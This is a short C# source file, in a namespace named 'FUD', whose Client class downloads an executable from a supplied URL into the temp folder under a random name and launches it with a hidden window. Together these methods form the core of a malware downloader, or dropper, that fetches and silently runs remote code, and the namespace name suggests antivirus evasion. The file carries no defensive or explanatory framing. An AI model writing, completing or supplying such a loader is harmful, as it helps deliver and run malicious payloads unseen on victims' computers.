using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace FUD
{
    public class Client
    {
        public void Download(string FileLocate, string url)
        {
            WebClient client = new WebClient();
            client.DownloadFile(new Uri(url), FileLocate + ".exe");
        }

        public  string FileName()
        {
            string Temp = Path.GetTempPath();
            string Ran = Path.GetRandomFileName();
            string FileLocate = Temp + Ran;
            return FileLocate;
        }

        public void Runprocess(string FileLocate)
        {
            Process process = new Process
            {
                StartInfo =
                {
                    FileName = FileLocate + ".exe", WindowStyle = ProcessWindowStyle.Hidden }
            };
            process.Start();
        }
    }
}